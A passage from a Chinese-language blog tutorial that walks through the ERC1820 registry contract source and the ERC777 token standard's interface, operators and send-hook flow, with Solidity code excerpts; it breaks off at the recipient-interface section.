class="line">&#x2F;&#x2F;&#x2F; @title ERC1820 伪自省注册表合约</span><br><span class="line">&#x2F;&#x2F;&#x2F; @notice 该合约是ERC1820注册表的官方实现。</span><br><span class="line">contract ERC1820Registry &#123;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice ERC165 无效 ID.</span><br><span class="line">    bytes4 constant internal INVALID_ID &#x3D; 0xffffffff;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice ERC165 的 supportsInterface 接口ID (&#x3D; &#96;bytes4(keccak256(&#39;supportsInterface(bytes4)&#39;))&#96;).</span><br><span class="line">    bytes4 constant internal ERC165ID &#x3D; 0x01ffc9a7;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 如果合约代表某个其他地址实现接口，则返回Magic值。</span><br><span class="line">    bytes32 constant internal ERC1820_ACCEPT_MAGIC &#x3D; keccak256(abi.encodePacked(&quot;ERC1820_ACCEPT_MAGIC&quot;));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 映射地址及接口到对应的实现合约地址</span><br><span class="line">    mapping(address &#x3D;&gt; mapping(bytes32 &#x3D;&gt; address)) internal interfaces;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 映射地址到管理者</span><br><span class="line">    mapping(address &#x3D;&gt; address) internal managers;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 每个地址和erc165接口的flag，指示是否被缓存。</span><br><span class="line">    mapping(address &#x3D;&gt; mapping(bytes4 &#x3D;&gt; bool)) internal erc165Cached;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 表示合约是&#39;addr&#39;的&#39;interfaceHash&#39;的&#39;实现者&#39;。</span><br><span class="line">    event InterfaceImplementerSet(address indexed addr, bytes32 indexed interfaceHash, address indexed implementer);</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 表示&#39;newManager&#39;是&#39;addr&#39;的新管理者的地址。</span><br><span class="line">    event ManagerChanged(address indexed addr, address indexed newManager);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 查询地址是否实现了接口以及通过哪个合约实现的。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _addr 查询地址（如果&#39;_addr&#39;是零地址，则假定为&#39;msg.sender&#39;）。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _interfaceHash 查询接口，它是接口名称字符串的 keccak256 哈希值</span><br><span class="line">    &#x2F;&#x2F;&#x2F; 例如: &#39;web3.utils.keccak256(&quot;ERC777TokensRecipient&quot;)&#39; 表示 &#39;ERC777TokensRecipient&#39; 接口.</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @return 返回实现者的地址，没有实现返回 ‘0’</span><br><span class="line">    function getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address) &#123;</span><br><span class="line">        address addr &#x3D; _addr &#x3D;&#x3D; address(0) ? msg.sender : _addr;</span><br><span class="line">        if (isERC165Interface(_interfaceHash)) &#123;</span><br><span class="line">            bytes4 erc165InterfaceHash &#x3D; bytes4(_interfaceHash);</span><br><span class="line">            return implementsERC165Interface(addr, erc165InterfaceHash) ? addr : address(0);</span><br><span class="line">        &#125;</span><br><span class="line">        return interfaces[addr][_interfaceHash];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 设置某个地址的接口由哪个合约实现，需要由管理员来设置。（每个地址是他自己的管理员，直到设置了一个新的地址）。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _addr 待设置的关联接口的地址（如果&#39;_addr&#39;是零地址，则假定为&#39;msg.sender&#39;）</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _interfaceHash 接口，它是接口名称字符串的 keccak256 哈希值</span><br><span class="line">    &#x2F;&#x2F;&#x2F; 例如: &#39;web3.utils.keccak256(&quot;ERC777TokensRecipient&quot;)&#39; 表示 &#39;ERC777TokensRecipient&#39; 接口。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _implementer 为地址&#39;_addr&#39;实现了 &#39;_interfaceHash&#39;接口的合约地址</span><br><span class="line">    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external &#123;</span><br><span class="line">        address addr &#x3D; _addr &#x3D;&#x3D; address(0) ? msg.sender : _addr;</span><br><span class="line">        require(getManager(addr) &#x3D;&#x3D; msg.sender, &quot;Not the manager&quot;);</span><br><span class="line"></span><br><span class="line">        require(!isERC165Interface(_interfaceHash), &quot;Must not be an ERC165 hash&quot;);</span><br><span class="line">        if (_implementer !&#x3D; address(0) &amp;&amp; _implementer !&#x3D; msg.sender) &#123;</span><br><span class="line">            require(</span><br><span class="line">                ERC1820ImplementerInterface(_implementer)</span><br><span class="line">                    .canImplementInterfaceForAddress(_interfaceHash, addr) &#x3D;&#x3D; ERC1820_ACCEPT_MAGIC,</span><br><span class="line">                &quot;Does not implement the interface&quot;</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        interfaces[addr][_interfaceHash] &#x3D; _implementer;</span><br><span class="line">        emit InterfaceImplementerSet(addr, _interfaceHash, _implementer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 为地址_addr 设置新的管理员地址_newManager， 新的管理员能给&#39;_addr&#39; 调用 &#39;setInterfaceImplementer&#39; 设置是实现者。</span><br><span class="line">    &#x2F;&#x2F;&#x2F;  (传 &#39;0x0&#39; 为地址_addr 重置管理员)</span><br><span class="line"></span><br><span class="line">    function setManager(address _addr, address _newManager) external &#123;</span><br><span class="line">        require(getManager(_addr) &#x3D;&#x3D; msg.sender, &quot;Not the manager&quot;);</span><br><span class="line">        managers[_addr] &#x3D; _newManager &#x3D;&#x3D; _addr ? address(0) : _newManager;</span><br><span class="line">        emit ManagerChanged(_addr, _newManager);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 获取地址 _addr的管理员</span><br><span class="line">    function getManager(address _addr) public view returns(address) &#123;</span><br><span class="line">        &#x2F;&#x2F; By default the manager of an address is the same address</span><br><span class="line">        if (managers[_addr] &#x3D;&#x3D; address(0)) &#123;</span><br><span class="line">            return _addr;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return managers[_addr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 计算给定名称的接口的keccak256哈希值。</span><br><span class="line">    function interfaceHash(string calldata _interfaceName) external pure returns(bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(_interfaceName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; ERC165 相关方法</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 更新合约是否实现了ERC165接口的缓存。</span><br><span class="line">    function updateERC165Cache(address _contract, bytes4 _interfaceId) external &#123;</span><br><span class="line">        interfaces[_contract][_interfaceId] &#x3D; implementsERC165InterfaceNoCache(</span><br><span class="line">            _contract, _interfaceId) ? _contract : address(0);</span><br><span class="line">        erc165Cached[_contract][_interfaceId] &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 检查合约是否实现ERC165接口。</span><br><span class="line">    &#x2F;&#x2F;  如果未缓存结果，则对合约地址进行查找。 如果结果未缓存或缓存已过期，则必须通过使用合约地址调用“updateERC165Cache”手动更新缓存。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _contract 要检查的合约地址。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _interfaceId 要检查ERC165接口。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @return True 如果合约实现了接口返回 true, 否则false.</span><br><span class="line">    function implementsERC165Interface(address _contract, bytes4 _interfaceId) public view returns (bool) &#123;</span><br><span class="line">        if (!erc165Cached[_contract][_interfaceId]) &#123;</span><br><span class="line">            return implementsERC165InterfaceNoCache(_contract, _interfaceId);</span><br><span class="line">        &#125;</span><br><span class="line">        return interfaces[_contract][_interfaceId] &#x3D;&#x3D; _contract;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 在不使用或更新缓存的情况下检查合约是否实现ERC165接口。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _contract 要检查的合约地址。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _interfaceId 要检查ERC165接口。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @return True 如果合约实现了接口返回 true, 否则false.</span><br><span class="line">    function implementsERC165InterfaceNoCache(address _contract, bytes4 _interfaceId) public view returns (bool) &#123;</span><br><span class="line">        uint256 success;</span><br><span class="line">        uint256 result;</span><br><span class="line"></span><br><span class="line">        (success, result) &#x3D; noThrowCall(_contract, ERC165ID);</span><br><span class="line">        if (success &#x3D;&#x3D; 0 || result &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        (success, result) &#x3D; noThrowCall(_contract, INVALID_ID);</span><br><span class="line">        if (success &#x3D;&#x3D; 0 || result !&#x3D; 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        (success, result) &#x3D; noThrowCall(_contract, _interfaceId);</span><br><span class="line">        if (success &#x3D;&#x3D; 1 &amp;&amp; result &#x3D;&#x3D; 1) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 检查_interfaceHash 是否是ERC165接口（以28个零结尾）。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _interfaceHash 要检查接口 hash。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @return  如果 &#39;_interfaceHash&#39;是ERC165接口返回 True, 否则返回false</span><br><span class="line">    function isERC165Interface(bytes32 _interfaceHash) internal pure returns (bool) &#123;</span><br><span class="line">        return _interfaceHash &amp; 0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @dev 调用合约接口，如果函数不存在也不抛出异常。</span><br><span class="line">    function noThrowCall(address _contract, bytes4 _interfaceId)</span><br><span class="line">        internal view returns (uint256 success, uint256 result)</span><br><span class="line">    &#123;</span><br><span class="line">        bytes4 erc165ID &#x3D; ERC165ID;</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            let x :&#x3D; mload(0x40)               &#x2F;&#x2F; Find empty storage location using &quot;free memory pointer&quot;</span><br><span class="line">            mstore(x, erc165ID)                &#x2F;&#x2F; Place signature at beginning of empty storage</span><br><span class="line">            mstore(add(x, 0x04), _interfaceId) &#x2F;&#x2F; Place first argument directly next to signature</span><br><span class="line"></span><br><span class="line">            success :&#x3D; staticcall(</span><br><span class="line">                30000,                         &#x2F;&#x2F; 30k gas</span><br><span class="line">                _contract,                     &#x2F;&#x2F; To addr</span><br><span class="line">                x,                             &#x2F;&#x2F; Inputs are stored at location x</span><br><span class="line">                0x24,                          &#x2F;&#x2F; Inputs are 36 (4 + 32) bytes long</span><br><span class="line">                x,                             &#x2F;&#x2F; Store output over input (saves space)</span><br><span class="line">                0x20                           &#x2F;&#x2F; Outputs are 32 bytes long</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            result :&#x3D; mload(x)                 &#x2F;&#x2F; Load the result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="部署方法"><a href="#部署方法" class="headerlink" title="部署方法"></a>部署方法</h3><p>ERC1820的部署方式相当巧妙，使用了无密钥部署方法（<a href="https://github.com/Arachnid/" target="_blank" rel="noopener">Nick</a>的方法），该方法依赖于一次性地址。</p><p>有兴趣的朋友可以去看<a href="https://learnblockchain.cn/docs/eips/eip-1820.html#%E8%A7%84%E8%8C%83" target="_blank" rel="noopener">EIP1820官方文档</a></p><h3 id="主要接口"><a href="#主要接口" class="headerlink" title="主要接口"></a>主要接口</h3><p>ERC1820合约提过了两个主要接口：</p><ul><li><code>setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer)</code><br>用来设置地址（_addr）的接口（_interfaceHash 接口名称的 keccak256 ）由哪个合约实现（_implementer）。</li><li><code>getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address)</code><br>这个函数用来查询地址（_addr）的接口由哪个合约实现。</li></ul><p>setInterfaceImplementer函数会参数信息记录到下面这个interfaces映射里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 记录 地址(第一个键) 的接口（第二个键）的实现地址（第二个值）</span><br><span class="line">mapping(address &#x3D;&gt; mapping(bytes32 &#x3D;&gt; address)) interfaces;</span><br></pre></td></tr></table></figure><p>相对应的 getInterfaceImplementer() 通过 interfaces 这个mapping 来获得接口的实现。</p><p>ERC777 使用 send转账时会分别在持有者和接收者地址上使用ERC1820 的getInterfaceImplementer函数进行查询，查看是否有对应的实现合约，ERC777 标准规范里预定了接口及函数名称，如果有实现则进行相应的调用。</p><h2 id="ERC777-标准规范"><a href="#ERC777-标准规范" class="headerlink" title="ERC777 标准规范"></a>ERC777 标准规范</h2><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>ERC777 为了在实现上可以兼容ERC20，除了查询函数和ERC20一致外，操作接口均采用的独立的命名（避免相同的命令无法分辨是哪个标准），ERC777的接口定义如下，要求所有的ERC777代币合约都必须实现这些接口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">interface ERC777Token &#123;</span><br><span class="line">    function name() external view returns (string memory);</span><br><span class="line">    function symbol() external view returns (string memory);</span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line">    function balanceOf(address holder) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 定义代币最小的划分粒度</span><br><span class="line">    function granularity() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 操作员 相关的操作（操作员是可以代表持有者发送和销毁代币的账号地址）</span><br><span class="line">    function defaultOperators() external view returns (address[] memory);</span><br><span class="line">    function isOperatorFor(</span><br><span class="line">        address operator,</span><br><span class="line">        address holder</span><br><span class="line">    ) external view returns (bool);</span><br><span class="line">    function authorizeOperator(address operator) external;</span><br><span class="line">    function revokeOperator(address operator) external;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 发送代币</span><br><span class="line">    function send(address to, uint256 amount, bytes calldata data) external;</span><br><span class="line">    function operatorSend(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data,</span><br><span class="line">        bytes calldata operatorData</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 销毁代币</span><br><span class="line">    function burn(uint256 amount, bytes calldata data) external;</span><br><span class="line">    function operatorBurn(</span><br><span class="line">        address from,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data,</span><br><span class="line">        bytes calldata operatorData</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 发送代币事件</span><br><span class="line">    event Sent(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed from,</span><br><span class="line">        address indexed to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes data,</span><br><span class="line">        bytes operatorData</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 铸币事件</span><br><span class="line">    event Minted(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes data,</span><br><span class="line">        bytes operatorData</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 销毁代币事件</span><br><span class="line">    event Burned(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed from,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes data,</span><br><span class="line">        bytes operatorData</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 授权运营商事件</span><br><span class="line">    event AuthorizedOperator(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed holder</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 撤销运营商事件</span><br><span class="line">    event RevokedOperator(address indexed operator, address indexed holder);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口说明与实现约定"><a href="#接口说明与实现约定" class="headerlink" title="接口说明与实现约定"></a>接口说明与实现约定</h3><p>ERC777 合约必须要通过 ERC1820 注册 <code>ERC777Token</code> 接口，这样任何人都可以查询合约是否是ERC777标准的合约，注册方法是: 调用ERC1820 注册合约的 <code>setInterfaceImplementer</code> 方法，参数 _addr 及 _implementer 均是合约的地址，_interfaceHash 是 <code>ERC777Token</code> 的 keccak256 哈希值（0xac7fbab5…177054）</p><p>如果 ERC777 要实现ERC20标准，还必须通过ERC1820 注册<code>ERC20Token</code>接口。</p><h3 id="ERC777-信息说明函数"><a href="#ERC777-信息说明函数" class="headerlink" title="ERC777 信息说明函数"></a>ERC777 信息说明函数</h3><p>name()，symbol()，totalSupply()，balanceOf(address) 和含义和在ERC20 中完全一样。</p><p>唯一不一样的是granularity()，用来定义代币最小的划分粒度（&gt;=1）， 要求必须在创建时设定，之后不可以更改，不管是在铸币、发送还是销毁操作的代币数量，必需是粒度的整数倍。</p><blockquote><p>granularity 和 ERC20 的 decimals 不一样，decimals用来定义小数位数，decimals 是ERC20 可选函数，为了兼容 ERC20 代币, decimals 函数要求必须返回18。而 granularity 表示的是基于最小位数(内部存储)的划分粒度。例如：0.5个代币存储为 <code>500,000,000,000,000,000</code> (0.5 X 10^18)，如果粒度为2，则最小转账单位是2（相对于<code>500,000,000,000,000,000</code>）。</p></blockquote><h3 id="ERC777运营商"><a href="#ERC777运营商" class="headerlink" title="ERC777运营商"></a>ERC777运营商</h3><p>ERC777 定义了一个新的运营商角色，运营商被作为移动代币的地址。 每个地址直观地移动自己的代币，将持有人和运营商的概念分开可以提供更大的灵活性。</p><p>此外，ERC777还可以定义默认操作员（默认操作员列表只能在代币创建时定义的，并且不能更改），默认操作员是被所有持有人授权的操作员，这可以为项目方管理代币带来方便，当然认何持有人仍然有权撤销默认操作员。</p><p>相关函数：</p><ul><li>defaultOperators(): 获取代币合约默认的操作员列表.</li><li>authorizeOperator(address operator): 设置一个地址作为msg.sender 的操作员，需要触发AuthorizedOperator事件。</li><li>revokeOperator(address operator): 移除 msg.sender 上 operator 操作员的权限， 需要触发RevokedOperator事件。</li><li>isOperatorFor(address operator, address holder)： 是否是某个持有者的操作员。</li></ul><p>利用运营商功能的另一个小的（并且不太明显的）好处是用户不再需要担心交易费Gas价格。现在可以将其委托给运营商。</p><h3 id="发送代币"><a href="#发送代币" class="headerlink" title="发送代币"></a>发送代币</h3><p>ERC777主要通过两个函数发送代币</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">send(address to, uint256 amount, bytes calldata data) external</span><br><span class="line"></span><br><span class="line">function operatorSend(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount,</span><br><span class="line">    bytes calldata data,</span><br><span class="line">    bytes calldata operatorData</span><br><span class="line">) external</span><br></pre></td></tr></table></figure><p>operatorSend 可以通过参数<code>operatorData</code>携带操作者的信息，发送代币除了执行对应账户的余额加减和触发事件之外，还有<strong>额外的规定</strong>：</p><ol><li>如果持有者有通过 ERC1820 注册 <code>ERC777TokensSender</code> 实现接口， 代币合约必须调用其 <code>tokensToSend</code> 钩子函数。</li><li>如果接收者有通过 ERC1820 注册 <code>ERC777TokensRecipient</code> 实现接口， 代币合约必须调用其 <code>tokensReceived</code> 钩子函数。</li><li>如果有 <code>tokensToSend</code> 钩子函数，必须在修改余额状态之前调用。</li><li>如果有 <code>tokensReceived</code> 钩子函数，必须在修改余额状态之后调用。</li><li>调用钩子函数及触发事件时， <code>data</code> 和 <code>operatorData</code>必须原样传递，因为 tokensToSend 和 tokensReceived 函数可能根据这个数据取消转账（触发 <code>revert</code>）。</li></ol><p>让我们来看看<code>_send</code>函数就能理解ERC777设计的巧妙之处了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function _send(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes memory userData,</span><br><span class="line">        bytes memory operatorData,</span><br><span class="line">        bool requireReceptionAck</span><br><span class="line">    ) internal virtual &#123;</span><br><span class="line">        require(from !&#x3D; address(0), &quot;ERC777: transfer from the zero address&quot;);</span><br><span class="line">        require(to !&#x3D; address(0), &quot;ERC777: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        address operator &#x3D; _msgSender();</span><br><span class="line"></span><br><span class="line">        _callTokensToSend(operator, from, to, amount, userData, operatorData);</span><br><span class="line"></span><br><span class="line">        _move(operator, from, to, amount, userData, operatorData);</span><br><span class="line"></span><br><span class="line">        _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里将交易分成了三个部分</p><h4 id="callTokensToSend"><a href="#callTokensToSend" class="headerlink" title="_callTokensToSend"></a>_callTokensToSend</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function _callTokensToSend(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes memory userData,</span><br><span class="line">        bytes memory operatorData</span><br><span class="line">    ) private &#123;</span><br><span class="line">        address implementer &#x3D; _ERC1820_REGISTRY.getInterfaceImplementer(from, _TOKENS_SENDER_INTERFACE_HASH);</span><br><span class="line">        &#x2F;&#x2F; 执行钩子函数</span><br><span class="line">        if (implementer !&#x3D; address(0)) &#123;</span><br><span class="line">            IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​        此函数会检查<code>from</code>合约是否在ERC1820注册表上注册了<code>tokensToSend</code>接口，如果注册了，就会触发钩子函数。</p><p>​    <strong>ERC777TokensSender 接口</strong>定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">interface ERC777TokensSender &#123;</span><br><span class="line">    function tokensToSend(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata userData,</span><br><span class="line">        bytes calldata operatorData</span><br><span class="line">    ) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上，如果持有者希望在转账时收到代币转移通知，就需要在ERC1820合约上注册及实现 <code>ERC777TokensSender</code> 接口。</p><blockquote><p>有一个地方需要注意: 对于所有的 ERC777 合约， 一个持有者地址只能注册一个ERC777TokensSender接口实现。因此 ERC777TokensSender 实现会被多个ERC777合约调用，在ERC777TokensSender接口的实现合约里， msg.sender 是ERC777合约地址，而不是操作者。</p></blockquote><h4 id="move"><a href="#move" class="headerlink" title="_move"></a>_move</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function _move(</span><br><span class="line">       address operator,</span><br><span class="line">       address from,</span><br><span class="line">       address to,</span><br><span class="line">       uint256 amount,</span><br><span class="line">       bytes memory userData,</span><br><span class="line">       bytes memory operatorData</span><br><span class="line">   ) private &#123;</span><br><span class="line">       _beforeTokenTransfer(operator, from, to, amount);</span><br><span class="line"></span><br><span class="line">       uint256 fromBalance &#x3D; _balances[from];</span><br><span class="line">       require(fromBalance &gt;&#x3D; amount, &quot;ERC777: transfer amount exceeds balance&quot;);</span><br><span class="line">       unchecked &#123;</span><br><span class="line">           _balances[from] &#x3D; fromBalance - amount;</span><br><span class="line">       &#125;</span><br><span class="line">       _balances[to] +&#x3D; amount;</span><br><span class="line"></span><br><span class="line">       emit Sent(operator, from, to, amount, userData, operatorData);</span><br><span class="line">       emit Transfer(from, to, amount);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>​        执行代币发送，实现和ERC20并无区别。在这里不过多介绍</p><h4 id="callTokensReceived"><a href="#callTokensReceived" class="headerlink" title="_callTokensReceived"></a>_callTokensReceived</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function _callTokensReceived(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes memory userData,</span><br><span class="line">        bytes memory operatorData,</span><br><span class="line">        bool requireReceptionAck</span><br><span class="line">    ) private &#123;</span><br><span class="line">        address implementer &#x3D; _ERC1820_REGISTRY.getInterfaceImplementer(to, _TOKENS_RECIPIENT_INTERFACE_HASH);</span><br><span class="line">        if (implementer !&#x3D; address(0)) &#123;</span><br><span class="line">            IERC777Recipient(implementer).tokensReceived(operator, from, to, amount, userData, operatorData);</span><br><span class="line">        &#125; else if (requireReceptionAck) &#123;</span><br><span class="line">            require(!to.isContract(), &quot;ERC777: token recipient contract has no implementer for ERC777TokensRecipient&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此函数会检查<code>to</code>合约是否在ERC1820注册表上注册<code>tokensReceived</code>接口,若注册，则触发钩子函数。</p><p><strong>ERC777TokensRecipient 接口</strong>定义如下：</p><figure class="highlight 